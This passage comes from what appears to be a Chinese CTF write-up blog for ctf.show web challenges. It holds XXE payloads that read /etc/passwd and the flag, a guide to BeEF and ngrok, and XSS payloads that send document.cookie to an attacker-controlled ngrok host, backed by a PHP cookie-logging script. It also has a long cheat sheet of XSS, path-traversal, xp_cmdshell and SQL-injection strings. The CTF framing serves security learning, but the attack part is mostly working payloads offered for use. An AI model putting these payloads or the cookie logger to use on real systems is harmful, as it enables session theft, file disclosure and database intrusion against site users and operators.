LIBXML_DTDLOAD);<span class="comment">#加载xml实体,参数为代替实体,加载外部子集</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);<span class="comment">#把 DOM 节点转换为 SimpleXMLElement 对象。</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;<span class="comment">#取creds节点的ctfshow的值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&lt;ctfshow&gt;&amp;goodies;&lt;/ctfshow&gt;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291600041.png" alt="image-20220329160007985"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&lt;ctfshow&gt;&amp;goodies;&lt;/ctfshow&gt;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291600660.png" alt="image-20220329160033588"></p><h1 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/ctfshow/ctf.show/XSS/"/>
      <url>/ctfshow/ctf.show/XSS/</url>
      
        <content type="html"><![CDATA[<h1 id="kali之beef使用"><a href="#kali之beef使用" class="headerlink" title="kali之beef使用"></a>kali之beef使用</h1><p>发现没装beef</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405104440084.png" alt="image-20220405104440084"></p><p>安装的时候出来问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dpkg --configure -a</span><br></pre></td></tr></table></figure><p>安装beef</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install beef-xss</span><br></pre></td></tr></table></figure><p>改一下默认密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/beef-xss/config.yaml</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405125752524.png" alt="image-20220405125752524"></p><p>启动beef</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/beef-xss/beef</span><br></pre></td></tr></table></figure><p>在后台启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/beef-xss/beef &amp;</span><br></pre></td></tr></table></figure><p>打开浏览器访问：<a href="http://192.168.5.152:3000/ui/authentication">http://192.168.5.152:3000/ui/authentication</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405125950419.png" alt="image-20220405125950419"></p><p>安装<a href="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz">ngrok</a>反向代理服务,解压</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf ngrok-stable-linux-amd64.tgz</span><br></pre></td></tr></table></figure><p>授权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ngrok authtoken [token码]</span><br></pre></td></tr></table></figure><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var img=document.createElement(&quot;img&quot;); img.src=&quot;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&quot;+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=&quot;window.open(&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;hello，gaga!&#x27;);&lt;/script&gt; //经典语句</span><br><span class="line">&gt;&quot;&#x27;&gt;&lt;img src=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&gt;&quot;&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;table background=&#x27;javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;</span><br><span class="line">&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;</span><br><span class="line">&quot;+alert(&#x27;XSS&#x27;)+&quot;</span><br><span class="line">&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line">&lt;s&amp;#99;ript&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;javas&amp;#99;ript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp</span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line">&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;</span><br><span class="line">a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x0A;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x0D;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&quot;&lt;IMG src=&quot;/java&quot;\0script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out</span><br><span class="line">&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;</span><br><span class="line">&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line">&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&amp;#39;);&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;</span><br><span class="line">&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;&gt;</span><br><span class="line">&lt;STYLE. TYPE=&quot;text/javascript&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE. TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE. type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;BASE HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);//&quot;&gt;</span><br><span class="line">getURL(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;)</span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript.:&quot;;d=&quot;alert(&#x27;XSS&#x27;);&quot;;eval(a+b+c+d);</span><br><span class="line">&lt;XML SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;BODY NLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&#x27;XSS&#x27;);&#125;&lt;/SCRIPT&gt;&lt;&quot;</span><br><span class="line">&lt;SCRIPT. SRC=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;</span><br><span class="line">&lt;SCRIPT. a=&quot;&gt;&quot;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT.=&quot;&gt;&quot;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT. a=&quot;&gt;&quot;&#x27;&#x27;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT.&quot;a=&#x27;&gt;&#x27;&quot;SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PTSRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br><span class="line">%3Cscript%3Ealert(&#x27;XSS&#x27;)%3C/script%3E</span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line">%3f.jsp</span><br><span class="line">%3f.jsp</span><br><span class="line">&amp;lt;script&amp;gt;alert(&#x27;Vulnerable&#x27;);&amp;lt;/script&amp;gt</span><br><span class="line">?sql_debug=1</span><br><span class="line">a%5c.aspx</span><br><span class="line">a/</span><br><span class="line">a?&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;</span><br><span class="line">&#x27;;exec%20master..xp_cmdshell%20&#x27;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&#x27;--&amp;&amp;</span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line">1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=</span><br><span class="line">../../../../../../../../etc/passwd</span><br><span class="line">..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">\..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">&#x27;&#x27;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br><span class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41&gt;</span><br><span class="line">&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27; &gt; out</span><br><span class="line">&lt;IMG SRC=&quot; javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;</span><br><span class="line">&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&lt;IFRAME SRC=javascript:alert(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=javascript:alert(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;BASE HREF=&quot;javascript:alert(&#x27;XSS&#x27;);//&quot;&gt;</span><br><span class="line">getURL(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)</span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&#x27;XSS&#x27;);&quot;;eval(a+b+c+d);</span><br><span class="line">&lt;XML SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&#x27;XSS&#x27;);&#125;&lt;/SCRIPT&gt;&lt;&quot;</span><br><span class="line">&lt;SCRIPT SRC=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span><br><span class="line">&lt;!--#exec cmd=&quot;/bin/echo &#x27;&lt;SCRIPT SRC&#x27;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &#x27;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&#x27;&quot;--&gt;</span><br><span class="line">&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; &#x27;&#x27; SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT &quot;a=&#x27;&gt;&#x27;&quot; SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">admin&#x27;--</span><br><span class="line">&#x27; or 0=0 --</span><br><span class="line">&quot; or 0=0 --</span><br><span class="line">or 0=0 --</span><br><span class="line">&#x27; or 0=0 #</span><br><span class="line">&quot; or 0=0 #</span><br><span class="line">or 0=0 #</span><br><span class="line">&#x27; or &#x27;x&#x27;=&#x27;x</span><br><span class="line">&quot; or &quot;x&quot;=&quot;x</span><br><span class="line">&#x27;) or (&#x27;x&#x27;=&#x27;x</span><br><span class="line">&#x27; or 1=1--</span><br><span class="line">&quot; or 1=1--</span><br><span class="line">or 1=1--</span><br><span class="line">&#x27; or a=a--</span><br><span class="line">&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or 1=1 --</span><br><span class="line">hi&#x27; or 1=1 --</span><br><span class="line">hi&#x27; or &#x27;a&#x27;=&#x27;a</span><br><span class="line">hi&#x27;) or (&#x27;a&#x27;=&#x27;a</span><br><span class="line">hi&quot;) or (&quot;a&quot;=&quot;a</span><br></pre></td></tr></table></figure><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281103297.png" alt="image-20220328110313250"></p><p>有回显测试一下有无xss</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281104410.png" alt="image-20220328110419356"></p><p><a href="http://xsscom.com//%E5%8E%BB%E5%9C%A8%E7%BA%BFxss%E5%B9%B3%E5%8F%B0%E4%B8%8A%E6%B5%8B%E8%AF%95%E4%B8%8B,%E5%A6%82%E6%9E%9C%E6%9C%89%E5%85%AC%E7%BD%91%E5%9C%B0%E5%9D%80%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BA">http://xsscom.com//去在线xss平台上测试下,如果有公网地址也可以自己搭建</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281116021.png" alt="image-20220328111645980"></p><p>复制上面的代码到存在xss的地方去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281117713.png" alt="image-20220328111724666"></p><p>返还原先平台,发现返回了flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281119612.png" alt="image-20220328111951582"></p><p>但是这个网站不太好用</p><h2 id="自己的服务器放一个php代码"><a href="#自己的服务器放一个php代码" class="headerlink" title="自己的服务器放一个php代码"></a>自己的服务器放一个php代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># zf.php</span><br><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">$log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($log, $cookie . &quot;\n&quot;);</span><br><span class="line">fclose($log);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// js代码</span><br><span class="line">&lt;script&gt;document.location.href=&#x27;http://fb53-111-17-194-91.ngrok.io/zf.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405134200287.png" alt="image-20220405134200287"></p><h2 id="burp插件之xssvalidator"><a href="#burp插件之xssvalidator" class="headerlink" title="burp插件之xssvalidator"></a>burp插件之xssvalidator</h2><p>下载<a href="http://phantomjs.org/download.html">Phantomjs</a>下载后配置环境变量，把bin目录下的这个exe加入环境变量,也可以不加,直接使用绝对路径</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281211396.png" alt="image-20220328121150359"></p><p>下载<a href="https://github.com/nVisium/xssValidator">xss.js</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281212891.png" alt="image-20220328121239860"></p><p>运行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281219376.png" alt="image-20220328121939347"></p><p>高版本的burp运行时会出现问题,这块使用2021.5.1的(后发现是汉化的原因)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281213423.png" alt="image-20220328121334340"></p><p>发送到intruder</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281215474.png" alt="image-20220328121533428"></p><p>添加位置</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281215888.png" alt="image-20220328121546838"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281216620.png" alt="image-20220328121602545"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281216968.png" alt="image-20220328121620895"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281216182.png" alt="image-20220328121640108"></p><p>复制一下grep phrase</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405155808986.png" alt="image-20220405155808986"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220405155821476.png" alt="image-20220405155821476"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281219191.png" alt="image-20220328121952137"></p><p>添加高亮 先下hae插件.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281238667.png" alt="image-20220328123824620"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 